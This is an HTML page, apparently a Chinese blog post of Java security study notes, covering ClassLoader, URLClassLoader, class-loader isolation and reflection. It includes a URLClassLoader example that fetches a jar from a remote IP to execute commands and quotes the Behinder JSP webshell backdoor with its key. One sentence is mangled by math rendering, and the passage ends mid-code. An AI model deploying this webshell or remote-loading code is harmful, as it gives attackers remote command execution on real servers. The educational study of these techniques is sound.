@@ -1,0 +1,1002 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>JAVA安全学习笔记（1） | skkyblu3</title>
+<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1711466907097">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="JAVA安全学习笔记（1） | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="ClassLoader
+基础的基础
+Java &amp; JVM
+.java文本文件 -&gt; .class字节码 -&gt; JVM执行
+编译 javac TestHelloWorld.java
+反编译 javap -c -l -p s..." />
+    <meta name="keywords" content="JAVA,学习笔记" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://skyblu3519.github.io">
+  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1711466907097" alt="">
+  </a>
+  <h1 class="site-title">
+    skkyblu3
+  </h1>
+  <p class="site-description">
+    sky, blue and ...
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+      
+        <a href="https://skyblu3519.github.io/post/you-lian" class="menu">
+          友链
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              JAVA安全学习笔记（1）
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-09-17
+              </span>
+              <span>
+                28 min read
+              </span>
+              
+                <a href="https://skyblu3519.github.io/tag/RwDqGW2an/" class="post-tag">
+                  # JAVA
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/SBvbIXKgV/" class="post-tag">
+                  # 学习笔记
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/java-an-quan-xue-xi-bi-ji.jpg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="classloader">ClassLoader</h1>
+<h2 id="基础的基础">基础的基础</h2>
+<p>Java &amp; JVM<br>
+.java文本文件 -&gt; .class字节码 -&gt; JVM执行</p>
+<p>编译 javac TestHelloWorld.java<br>
+反编译 javap -c -l -p src/test/TestHelloWorld.class （JVM字节码）<br>
+<img src="https://skyblu3519.github.io/post-images/1694964925269.png" alt="" loading="lazy"><br>
+查看二进制内容 hexdump -c src/test/TestHelloWorld.class</p>
+<p>一切的<strong>Java类（.class文件）<strong>都必须经过JVM加载后才能运行，而ClassLoader的主要作用就是</strong>Java类文件的加载</strong>。在JVM类加载器中最顶层的是：</p>
+<ul>
+<li>Bootstrap ClassLoader（引导类加载器）</li>
+<li>Extension ClassLoader（扩展类加载器）</li>
+<li>App ClassLoader（系统类加载器）默认的加载器</li>
+</ul>
+<p>**ClassLoader.getSystemClassLoader()**返回的系统类加载器也是AppClassLoader。</p>
+<p>每个类都有一个<strong>ClassLoader</strong>，尝试获取被<strong>Bootstrap ClassLoader</strong>类加载器所加载的类的ClassLoader时候都会返回null。</p>
+<p>java类加载方式：</p>
+<ul>
+<li>显式：Java反射、ClassLoader **动态加载 **自定义类加载器去加载任意的类</li>
+<li>隐式：<strong>类名.方法名()</strong>、<strong>new类实例</strong></li>
+</ul>
+<p><strong>常用的类动态加载方式：</strong></p>
+<pre><code class="language-java">// 反射加载TestHelloWorld示例
+Class.forName(&quot;com.anbai.sec.classloader.TestHelloWorld&quot;);
+
+// ClassLoader加载TestHelloWorld示例
+this.getClass().getClassLoader().loadClass(&quot;com.anbai.sec.classloader.TestHelloWorld&quot;);
+</code></pre>
+<p><strong>Class.forName(&quot;类名&quot;) <strong>默认会初始化被加载类的静态属性和方法，如果不希望初始化类可以使用</strong>Class.forName(&quot;类名&quot;, 是否初始化类, 类加载器)</strong>，而ClassLoader.loadClass默认<strong>不会初始化类方法</strong>。</p>
+<h2 id="classloader类加载流程">ClassLoader类加载流程</h2>
+<p><img src="https://skyblu3519.github.io/post-images/1694964938530.png" alt="" loading="lazy"><br>
+<strong>1 检查类是否已加载</strong><br>
+首先，它调用<strong>findLoadedClass</strong>方法来检查该类是否已经被加载到内存中。如果已加载，则直接返回该类的<strong>Class</strong>对象。</p>
+<p><strong>2 使用父类加载器</strong><br>
+如果类还没有被加载，则检查是否有父类加载器存在。如果有，它会尝试使用父类加载器来加载这个类。如果父类加载器可以加载这个类，它就会这样做，否则，流程会继续。</p>
+<p><strong>3 使用Bootstrap ClassLoader</strong><br>
+如果没有父类加载器或父类加载器无法加载该类，那么将使用Bootstrap ClassLoader来尝试加载它。Bootstrap ClassLoader是JVM的一部分，它可以加载核心Java类库（比如<strong>java.lang.</strong>*）。</p>
+<p><strong>4 使用当前类加载器的 findClass 方法</strong><br>
+如果前面的步骤都失败了，那么它会调用当前类加载器的<strong>findClass</strong>方法来尝试加载这个类。这是你可以覆写的一个方法，以实现你自己的类加载逻辑。</p>
+<p><strong>5 调用 defineClass 方法</strong><br>
+如果<strong>findClass</strong>方法找到了类的字节码，它应该使用<strong>defineClass</strong>方法来注册这个类到JVM中。<br>
+6 链接类<br>
+最后，如果<strong>loadClass</strong>方法被调用时传递的<strong>resolve</strong>参数是<strong>true</strong>，它还将调用<strong>resolveClass</strong>方法来链接这个类。链接确保类可以被正确使用，它涉及验证类文件和初始化静态变量等步骤。</p>
+<h2 id="自定义classloader">自定义ClassLoader</h2>
+<p>错误记录</p>
+<pre><code class="language-java">➜  src javac test/TestClassLoader.java
+test/TestClassLoader.java:2: 错误: 找不到符号
+import test.TestHelloWorld;
+           ^
+  符号:   类 TestHelloWorld
+  位置: 程序包 test
+test/TestClassLoader.java:6: 错误: 找不到符号
+        TestHelloWorld t = new TestHelloWorld();
+        ^
+  符号:   类 TestHelloWorld
+  位置: 类 TestClassLoader
+test/TestClassLoader.java:6: 错误: 找不到符号
+        TestHelloWorld t = new TestHelloWorld();
+                               ^
+  符号:   类 TestHelloWorld
+  位置: 类 TestClassLoader
+3 个错误
+
+</code></pre>
+<p>遇到这种问题通常是由于编译时类路径（classpath）的问题。编译时，<strong>javac</strong>需要知道在哪里可以找到所有需要的类。当你编译<strong>TestClassLoader.java</strong>时，它需要能够找到<strong>TestHelloWorld.class</strong>文件。</p>
+<p>为了解决这个问题，你可以尝试在编译<strong>TestClassLoader.java</strong>时指定类路径。默认情况下，类路径应该包含当前目录（<strong>.</strong>），但在某些情况下，它可能没有被正确设置。</p>
+<p>你可以通过添加**-cp .**参数来指定类路径，如下：</p>
+<pre><code class="language-java">javac -cp . test/TestClassLoader.java
+</code></pre>
+<p>这个命令告诉<strong>javac</strong>在当前目录中查找类文件。</p>
+<p>写一个<strong>TestClassLoader，如果和TestHelloWorld在一个classpath下可以直接加载</strong></p>
+<pre><code class="language-java">package test;
+
+public class TestClassLoader {
+    public static void main(String[] args) {
+        TestHelloWorld t = new TestHelloWorld();
+        String str = t.hello();
+        System.out.print(str);
+    }
+}
+
+</code></pre>
+<h3 id="重写findclass">重写findClass</h3>
+<p>获取<strong>TestHelloWorld的字节码，写一个</strong></p>
+<pre><code class="language-java">package test;
+
+import java.io.IOException;
+import java.nio.file.Files;
+import java.nio.file.Path;
+import java.util.Arrays;
+
+public class GetByteCode {
+    public static void main(String[] args) {
+        try {
+            byte[] bytecode = Files.readAllBytes(Path.of(&quot;./test/TestHelloWorld.class&quot;));
+
+            // 将字节码数组转换为字符串并打印到控制台
+            System.out.println(Arrays.toString(bytecode));
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+}
+
+
+</code></pre>
+<p>然后，如果当前路径下没有<strong>TestHelloWorld，<strong>那么我们可以使用</strong>自定义类</strong>加载器重写<strong>findClass</strong>方法，然后在调用<strong>defineClass</strong>方法的时候传入<strong>TestHelloWorld类的字节码</strong>的方式来向JVM中定义一个TestHelloWorld类，最后通过<strong>反射机制</strong>就可以调用TestHelloWorld类的hello方法了。</p>
+<p>测试代码：</p>
+<pre><code class="language-java">package test;
+
+import java.lang.reflect.Method;
+
+public class DecoyClassLoader extends  ClassLoader{
+    private static String testClassName = &quot;test.TestHelloWorld&quot;;
+
+    private static byte[] testClassBytes = new byte[]{
+            // 这里贴钱吗的字节码
+    };
+
+    @Override
+    public Class&lt;?&gt; findClass(String name) throws ClassNotFoundException {
+        // 只处理TestHelloWorld类
+        if (name.equals(testClassName)) {
+            // 调用JVM的native方法定义TestHelloWorld类
+            return defineClass(testClassName, testClassBytes, 0, testClassBytes.length);
+        }
+
+        return super.findClass(name);
+    }
+
+    public static void main(String[] args) {
+        DecoyClassLoader loader = new DecoyClassLoader();
+
+        try {
+            // 使用自定义的类加载器加载TestHelloWorld类
+            Class testClass = loader.loadClass(testClassName);
+
+            // 反射创建TestHelloWorld类，等价于 TestHelloWorld t = new TestHelloWorld();
+            Object testInstance = testClass.newInstance();
+
+            // 反射获取hello方法
+            Method method = testInstance.getClass().getMethod(&quot;hello&quot;);
+
+            // 反射调用hello方法,等价于 String str = t.hello();
+            String str = (String) method.invoke(testInstance);
+
+            System.out.println(str);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+
+    }
+}
+
+</code></pre>
+<ul>
+<li>你创建了一个名为<strong>DecoyClassLoader</strong>的类，该类继承了<strong>ClassLoader</strong>类。定义了两个私有静态变量来存储你想要加载的类的名字和字节码。</li>
+<li>你重写了<strong>findClass</strong>方法来定制类的加载过程。如果请求的类名与你想要加载的类名匹配，则使用<strong>defineClass</strong>方法来定义该类，传递类名和字节码数组来创建一个<strong>Class</strong>对象。</li>
+<li>在<strong>main</strong>方法中，你创建了<strong>DecoyClassLoader</strong>的一个实例，并使用它来加载你的目标类。一旦类被加载，你就使用反射来创建该类的一个实例，并调用其<strong>hello</strong>方法。</li>
+</ul>
+<p><strong>运行时背后的流程</strong></p>
+<ol>
+<li><strong>类的加载</strong>当你运行程序时，JVM首先会加载<strong>DecoyClassLoader</strong>类（通过默认的类加载器）。</li>
+<li><strong>创建DecoyClassLoader实例</strong>在<strong>main</strong>方法中创建<strong>DecoyClassLoader</strong>的一个实例。</li>
+<li><strong>加载TestHelloWorld类</strong>使用<strong>DecoyClassLoader</strong>实例来加载<strong>TestHelloWorld</strong>类。它首先尝试找到已加载的类，如果找不到，则尝试使用父类加载器加载它。如果父类加载器也无法加载该类，则调用<strong>findClass</strong>方法来加载它。</li>
+<li><strong>类的实例化和方法调用</strong>一旦<strong>TestHelloWorld</strong>类被加载，就使用反射来创建其一个实例，并调用其<strong>hello</strong>方法来获取一个字符串，然后打印该字符串。</li>
+</ol>
+<p>补充一些知识<br>
+<strong>Java类加载器 (ClassLoader)</strong></p>
+<ol>
+<li><strong>类加载器的工作原理</strong>
+<ul>
+<li><strong>加载</strong>: 通过读取 <strong>.class</strong> 文件或其他方式来获取类的字节码。</li>
+<li><strong>链接</strong>: 验证字节码结构的正确性，为静态字段分配内存，将符号引用转换为直接引用等。</li>
+<li><strong>初始化</strong>: 执行类的初始化代码，如静态块等。</li>
+</ul>
+</li>
+<li><strong>自定义类加载器</strong>
+<ul>
+<li>可以通过继承 <strong>ClassLoader</strong> 类来创建自定义类加载器。</li>
+<li>需要重写 <strong>findClass</strong> 方法来定义如何加载类。</li>
+</ul>
+</li>
+<li><strong>Bootstrap ClassLoader</strong>
+<ul>
+<li>JVM的内建类加载器，用于加载核心Java类库。</li>
+</ul>
+</li>
+</ol>
+<p><strong>Java 反射 (Reflection)</strong></p>
+<ol>
+<li><strong>反射的概念</strong>
+<ul>
+<li>允许你在运行时检查和修改程序的行为。</li>
+</ul>
+</li>
+<li><strong>反射的用途</strong>
+<ul>
+<li>动态加载类。</li>
+<li>在运行时获取类的信息（如方法，字段等）。</li>
+<li>动态调用方法。</li>
+</ul>
+</li>
+<li><strong>Class 类</strong>
+<ul>
+<li>表示正在运行的 Java 应用程序中的类和接口。</li>
+</ul>
+</li>
+<li><strong>创建类的实例</strong>
+<ul>
+<li><strong>Class.newInstance</strong> 方法用于创建类的实例。</li>
+</ul>
+</li>
+<li><strong>获取和调用方法</strong>
+<ul>
+<li>使用 <strong>Class.getMethod</strong> 来获取特定的方法。</li>
+<li>使用 <strong>Method.invoke</strong> 来调用一个方法。</li>
+</ul>
+</li>
+</ol>
+<p><strong>Java方法签名</strong></p>
+<ol>
+<li><strong>泛型方法签名</strong>
+<ul>
+<li><strong>public Class<?> loadClass(String name)** 中的 **<?></strong> 表示一个未知的泛型类型。</li>
+</ul>
+</li>
+</ol>
+<h2 id="urlclassloader">URLClassLoader</h2>
+<p><strong>.jar</strong> 文件是 Java ARchive 文件的简称，它是一个包含多个 Java 类文件和相关的元数据和资源（文本、图片等）的文件。它基本上是一个 ZIP 文件，其内部结构和 ZIP 文件相同。<br>
+在 Java 开发中，<strong>.jar</strong> 文件通常用于打包多个类文件和相关资源，使其可以作为一个文件轻松分发和管理。你可以将它看作是一个类库或应用程序的集合，它包含所有你需要运行 Java 应用程序或使用 Java 类库的东西。</p>
+<p>你可以使用 <strong>jar</strong> 命令行工具创建 <strong>.jar</strong> 文件，该工具包含在 JDK 中。例如，以下命令将 <strong>MyClass.class</strong> 和 <strong>MyResource.txt</strong> 文件打包到一个名为 <strong>myjar.jar</strong> 的 <strong>.jar</strong> 文件中：</p>
+<pre><code class="language-java">jar cvf myjar.jar MyClass.class MyResource.txt
+</code></pre>
+<p>运行</p>
+<pre><code>java -jar myjar.jar
+</code></pre>
+<p>CMD.java</p>
+<pre><code class="language-java">import java.io.IOException;
+
+public class CMD {
+
+    public static Process exec(String cmd) throws IOException {
+        return Runtime.getRuntime().exec(cmd);
+    }
+
+}
+</code></pre>
+<pre><code class="language-java">javac CMD.java
+jar cvf cmd.jar CMD.class 
+</code></pre>
+<p>URLClassLoader继承了ClassLoader，URLClassLoader提供了加载远程资源的能力，在写漏洞利用的payload或者webshell的时候我们可以使用这个特性来加载远程的jar来实现远程的类方法调用。</p>
+<pre><code class="language-java">package test;
+
+import java.io.ByteArrayOutputStream;
+import java.io.InputStream;
+import java.net.URL;
+import java.net.URLClassLoader;
+
+public class TestURLClassLoader {
+
+    public static void main(String[] args) {
+        try {
+            // 定义远程加载的jar路径
+            URL url = new URL(&quot;http://10.211.55.12/cmd.jar&quot;);
+
+            // 创建URLClassLoader对象，并加载远程jar包
+            URLClassLoader ucl = new URLClassLoader(new URL[]{url});
+
+            // 定义需要执行的系统命令
+            String cmd = &quot;ls&quot;;
+
+            // 通过URLClassLoader加载远程jar包中的CMD类
+            Class cmdClass = ucl.loadClass(&quot;CMD&quot;);
+
+            // 调用CMD类中的exec方法，等价于: Process process = CMD.exec(&quot;whoami&quot;);
+            Process process = (Process) cmdClass.getMethod(&quot;exec&quot;, String.class).invoke(null, cmd);
+
+            // 获取命令执行结果的输入流
+            InputStream           in   = process.getInputStream();
+            ByteArrayOutputStream baos = new ByteArrayOutputStream();
+            byte[]                b    = new byte[1024];
+            int                   a    = -1;
+
+            // 读取命令执行结果
+            while ((a = in.read(b)) != -1) {
+                baos.write(b, 0, a);
+            }
+
+            // 输出命令执行结果
+            System.out.println(baos.toString());
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+}
+
+</code></pre>
+<p>这里<code>newURL[]{url}</code></p>
+<ol>
+<li><strong>new URL[]</strong>: 这是创建一个新的URL对象数组的语法。它创建一个URL数组。</li>
+<li><strong>{url}</strong>: 这里我们使用花括号 <strong>{}</strong> 来初始化数组。我们将<strong>url</strong>对象放入花括号中，表示这个数组的第一个（也是唯一的）元素是<strong>url</strong>对象。</li>
+</ol>
+<p>所以整体来说，<strong>new URL[]{url}<strong>创建了一个包含一个元素的URL数组，该元素就是我们之前创建的</strong>url</strong>对象。<br>
+而<strong>URLClassLoader</strong>的构造函数接受一个URL数组作为参数，这意味着它可以<strong>接受多个URL来从多个位置加载类和资源</strong>。在我们的例子中，我们只有一个URL，所以我们创建了一个只有一个元素的数组来传递给<strong>URLClassLoader</strong>的构造函数。<br>
+<img src="https://skyblu3519.github.io/post-images/1694964959887.png" alt="" loading="lazy"></p>
+<h2 id="类加载隔离">类加载隔离</h2>
+<p>创建类加载器的时候可以指定该类加载的父类加载器，ClassLoader是有隔离机制的，不同的ClassLoader可以加载相同的Class（两者必须是非继承关系），同级ClassLoader跨类加载器调用方法时必须使用反射。<br>
+<img src="https://skyblu3519.github.io/post-images/1694964967982.png" alt="" loading="lazy"></p>
+<h3 id="跨类加载器加载">跨类加载器加载</h3>
+<p>代码：</p>
+<pre><code class="language-java">package test;
+
+import java.lang.reflect.Method;
+
+import static test.DecoyClassLoader.testClassBytes;
+import static test.DecoyClassLoader.testClassName;
+
+public class TestCrossClassLoader {
+    public static class ClassLoaderA extends ClassLoader {
+
+        public ClassLoaderA(ClassLoader parent) {
+            super(parent);
+        }
+
+        {
+            // 加载类字节码
+            defineClass(testClassName, testClassBytes, 0, testClassBytes.length);
+        }
+
+    }
+
+    public static class ClassLoaderB extends ClassLoader {
+
+        public ClassLoaderB(ClassLoader parent) {
+            super(parent);
+        }
+
+        {
+            // 加载类字节码
+            defineClass(testClassName, testClassBytes, 0, testClassBytes.length);
+        }
+
+    }
+
+    public static void main(String[] args) throws Exception {
+        ClassLoader parentClassLoader = ClassLoader.getSystemClassLoader();
+        ClassLoaderA aClassLoader = new ClassLoaderA(parentClassLoader);
+        ClassLoaderB bClassLoader = new ClassLoaderB(parentClassLoader);
+
+        Class&lt;?&gt; aClass  = Class.forName(testClassName, true, aClassLoader);
+        Class&lt;?&gt; aaClass = Class.forName(testClassName, true, aClassLoader);
+        Class&lt;?&gt; bClass  = Class.forName(testClassName, true, bClassLoader);
+
+        System.out.println(&quot;aClass == aaClass：&quot; + (aClass == aaClass));
+        System.out.println(&quot;aClass == bClass：&quot; + (aClass == bClass));
+
+        System.out.println(&quot;\n&quot; + aClass.getName() + &quot;方法清单：&quot;);
+
+        Method[] methods = aClass.getDeclaredMethods();
+
+        for (Method method : methods) {
+            System.out.println(method);
+        }
+
+        // 创建类实例
+        Object instanceA = aClass.newInstance();
+
+        // 获取hello方法
+        Method helloMethod = aClass.getMethod(&quot;hello&quot;);
+
+        // 调用hello方法
+        String result = (String) helloMethod.invoke(instanceA);
+
+        System.out.println(&quot;\n反射调用：&quot; + testClassName + &quot;类&quot; + helloMethod.getName() + &quot;方法，返回结果：&quot; + result);
+    }
+}
+
+</code></pre>
+<p><strong>public static class ClassLoaderA extends ClassLoader</strong><br>
+在Java中，你可以在类的实例初始化代码块中编写代码，这些代码在每次创建类的新实例时都会执行。这是通过使用大括号 <strong>{}</strong> 来定义代码块实现的，如你在代码中所见。<br>
+这段代码是一个实例初始化代码块，它将在每次创建<strong>ClassLoaderA</strong>类的新实例时执行。</p>
+<p>** ClassLoaderA aClassLoader = new ClassLoaderA(parentClassLoader);**<br>
+** ClassLoaderB bClassLoader = new ClassLoaderB(parentClassLoader);**<br>
+ClassLoaderA和ClassLoaderB都使用System ClassLoader作为父类加载器。然后在实例化这两个加载器的时候，他们都用defineClass加载了一个类到内存里，虽然背后都是用它们继承来的父类加载器做的。但内存里的两个类依然是不同的。</p>
+<p>C<strong>lass<?> aClass = Class.forName(testClassName, true, aClassLoader); **
+**Class<?> bClass = Class.forName(testClassName, true, bClassLoader);</strong><br>
+这个我理解是从JVM取出这两个类<br>
+**Class.forName(String name, boolean initialize, ClassLoader loader)**方法有三个参数：</p>
+<ol>
+<li><strong>name</strong>：要加载的类的全限定名（包名+类名）。</li>
+<li><strong>initialize</strong>：是否要初始化类。初始化意味着会执行类的静态初始化块和静态字段的初始化。如果设置为<strong>false</strong>，则类不会被初始化，但是会被加载和连接。</li>
+<li><strong>loader</strong>：用于加载类的类加载器。</li>
+</ol>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/1694964987851.png" alt="" loading="lazy"></figure>
+<h2 id="jsp自定义类加载后门">JSP自定义类加载后门</h2>
+<p>浅看一下</p>
+<pre><code class="language-java">&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot; %&gt;
+&lt;%!
+    class U extends ClassLoader {
+
+        U(ClassLoader c) {
+            super(c);
+        }
+
+        public Class g(byte[] b) {
+            return super.defineClass(b, 0, b.length);
+        }
+    }
+%&gt;
+&lt;%
+    if (request.getMethod().equals(&quot;POST&quot;)) {
+        String k = &quot;e45e329feb5d925b&quot;;/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
+        session.putValue(&quot;u&quot;, k);
+        Cipher c = Cipher.getInstance(&quot;AES&quot;);
+        c.init(2, new SecretKeySpec(k.getBytes(), &quot;AES&quot;));
+        new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);
+    }
+%&gt;
+</code></pre>
+<p>后门会经过AES解密得到一个随机类名的类字节码，然后调用自定义的类加载器加载，最终通过该类重写的equals方法实现恶意攻击</p>
+<p>最后这一长串的代码可以分三块：</p>
+<pre><code class="language-java">new U(this.getClass().getClassLoader())
+.g(
+    c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))
+).newInstance().equals(pageContext);
+</code></pre>
+<p><strong>问题：</strong></p>
+<ol>
+<li>在冰蝎JSP木马的代码中，通过自定义类加载器加载并实例化一个类后，直接调用了该类的 <strong>equals</strong> 方法。为什么可以这样做？</li>
+<li>在使用反射调用类中的方法时，为什么不能直接使用 <strong>instance.methodName()</strong> 的格式调用，而需要使用更复杂的反射API来调用？</li>
+<li><strong>newInstance().equals(pageContext)</strong> 是如何直接调用的，没有通过反射API是如何实现的？</li>
+</ol>
+<p><strong>答案：</strong></p>
+<ol>
+<li>**直接调用 equals 方法<br>
+**之所以可以直接调用 <strong>equals</strong> 方法，是因为 <strong>equals</strong> 方法是 <strong>Object</strong> 类的一个方法，所有的类都是 <strong>Object</strong> 类的子类。因此，编译器知道任何类都会有一个 <strong>equals</strong> 方法，这就允许你直接调用它而不需要任何额外的步骤。</li>
+<li>**为什么需要反射来调用方法<br>
+**在你没有一个类型明确的引用时（例如，当你通过类加载器动态加载一个类时），你不能直接调用该类的方法，因为编译器无法确定这些方法是否存在。在这种情况下，你需要使用反射API来动态调用方法。反射允许你在运行时动态访问和调用方法，而不是在编译时进行静态类型检查。</li>
+<li>**使用 newInstance().equals(pageContext)<br>
+**在这段代码中，<strong>newInstance()</strong> 方法用于创建一个该类的新实例。然后，使用 <strong>equals</strong> 方法来调用该实例的 <strong>equals</strong> 方法，并将 <strong>pageContext</strong> 传递给它。这是可能的，因为如我们之前提到的，<strong>equals</strong> 方法是 <strong>Object</strong> 类的一部分，而所有类都继承自 <strong>Object</strong> 类。</li>
+</ol>
+<h2 id="待办">待办</h2>
+<p>FastJson攻击链分析</p>
+<ul>
+<li>BCEL ClassLoader</li>
+<li>Xalan ClassLoader</li>
+</ul>
+<h1 id="java反射机制">Java反射机制</h1>
+<h2 id="获取class对象">获取Class对象</h2>
+<p>Java反射操作的是java.lang.Class对象，所以我们需要先想办法获取到Class对象，通常我们有如下几种方式获取一个类的Class对象：</p>
+<ol>
+<li>类名.class，如:com.anbai.sec.classloader.TestHelloWorld.class。</li>
+<li>Class.forName(&quot;com.anbai.sec.classloader.TestHelloWorld&quot;)。</li>
+<li>classLoader.loadClass(&quot;com.anbai.sec.classloader.TestHelloWorld&quot;);</li>
+</ol>
+<p>获取<strong>数组类型的Class对象</strong>需要使用Java类型的描述符方式，如下：</p>
+<pre><code class="language-java">Class&lt;?&gt; doubleArray = Class.forName(&quot;[D&quot;);//相当于double[].class
+Class&lt;?&gt; cStringArray = Class.forName(&quot;[[Ljava.lang.String;&quot;);// 相当于String[][].class
+</code></pre>
+<p>获取<strong>Runtime类的例子：</strong></p>
+<pre><code class="language-java">String className     = &quot;java.lang.Runtime&quot;;
+Class  runtimeClass1 = Class.forName(className);
+Class  runtimeClass2 = java.lang.Runtime.class;
+Class  runtimeClass3 = ClassLoader.getSystemClassLoader().loadClass(className);
+</code></pre>
+<p>反射调用内部类的时候需要使用<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">来</mi><mi mathvariant="normal">代</mi><mi mathvariant="normal">替</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><mi mathvariant="normal">如</mi><mi>c</mi><mi>o</mi><mi>m</mi><mi mathvariant="normal">.</mi><mi>a</mi><mi>n</mi><mi>b</mi><mi>a</mi><mi>i</mi><mi mathvariant="normal">.</mi><mi>T</mi><mi>e</mi><mi>s</mi><mi>t</mi><mi mathvariant="normal">类</mi><mi mathvariant="normal">有</mi><mi mathvariant="normal">一</mi><mi mathvariant="normal">个</mi><mi mathvariant="normal">叫</mi><mi mathvariant="normal">做</mi><mi>H</mi><mi>e</mi><mi>l</mi><mi>l</mi><mi>o</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">内</mi><mi mathvariant="normal">部</mi><mi mathvariant="normal">类</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">那</mi><mi mathvariant="normal">么</mi><mi mathvariant="normal">调</mi><mi mathvariant="normal">用</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">时</mi><mi mathvariant="normal">候</mi><mi mathvariant="normal">就</mi><mi mathvariant="normal">应</mi><mi mathvariant="normal">该</mi><mi mathvariant="normal">将</mi><mi mathvariant="normal">类</mi><mi mathvariant="normal">名</mi><mi mathvariant="normal">写</mi><mi mathvariant="normal">成</mi><mi mathvariant="normal">：</mi><mi>c</mi><mi>o</mi><mi>m</mi><mi mathvariant="normal">.</mi><mi>a</mi><mi>n</mi><mi>b</mi><mi>a</mi><mi>i</mi><mi mathvariant="normal">.</mi><mi>T</mi><mi>e</mi><mi>s</mi><mi>t</mi></mrow><annotation encoding="application/x-tex">来代替.,如com.anbai.Test类有一个叫做Hello的内部类，那么调用的时候就应该将类名写成：com.anbai.Test</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">来</span><span class="mord cjk_fallback">代</span><span class="mord cjk_fallback">替</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">如</span><span class="mord mathdefault">c</span><span class="mord mathdefault">o</span><span class="mord mathdefault">m</span><span class="mord">.</span><span class="mord mathdefault">a</span><span class="mord mathdefault">n</span><span class="mord mathdefault">b</span><span class="mord mathdefault">a</span><span class="mord mathdefault">i</span><span class="mord">.</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord cjk_fallback">类</span><span class="mord cjk_fallback">有</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">叫</span><span class="mord cjk_fallback">做</span><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">内</span><span class="mord cjk_fallback">部</span><span class="mord cjk_fallback">类</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">那</span><span class="mord cjk_fallback">么</span><span class="mord cjk_fallback">调</span><span class="mord cjk_fallback">用</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">候</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">应</span><span class="mord cjk_fallback">该</span><span class="mord cjk_fallback">将</span><span class="mord cjk_fallback">类</span><span class="mord cjk_fallback">名</span><span class="mord cjk_fallback">写</span><span class="mord cjk_fallback">成</span><span class="mord cjk_fallback">：</span><span class="mord mathdefault">c</span><span class="mord mathdefault">o</span><span class="mord mathdefault">m</span><span class="mord">.</span><span class="mord mathdefault">a</span><span class="mord mathdefault">n</span><span class="mord mathdefault">b</span><span class="mord mathdefault">a</span><span class="mord mathdefault">i</span><span class="mord">.</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span></span></span></span>Hello。</p>
+<h2 id="反射javalangruntime">反射java.lang.Runtime</h2>
+<p>不使用反射的本地命令执行</p>
+<pre><code class="language-java">System.out.println(org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec(&quot;whoami&quot;).getInputStream(), &quot;UTF-8&quot;));
+</code></pre>
+<p><code>org.apache.commons.io.IOUtils.toString</code>用来将<strong>InputStream</strong>转为<strong>String</strong></p>
+<p><code>**使用反射的方法**</code></p>
+<pre><code class="language-java">package reflect;
+
+import java.lang.reflect.*;
+import java.io.InputStream;
+
+public class RunReflect {
+    public static void main(String[] args) throws Exception {
+
+        Class runtimeClass1 = Class.forName(&quot;java.lang.Runtime&quot;);
+
+        // 获取构造方法
